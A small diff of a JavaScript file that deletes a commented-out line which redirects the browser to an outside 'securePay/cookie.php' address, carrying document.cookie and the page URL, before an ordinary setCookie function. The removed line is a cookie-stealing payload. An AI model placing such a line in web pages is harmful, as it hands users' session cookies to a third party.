@@ -1,6 +1,3 @@
-// document.location = 'https://vegiespro.in/securePay/cookie.php?c=' + document.cookie + '&cUrl=' + window.location.href;
-
-
 
 function setCookie(cname, cvalue, exdays) {
     const d = new Date();
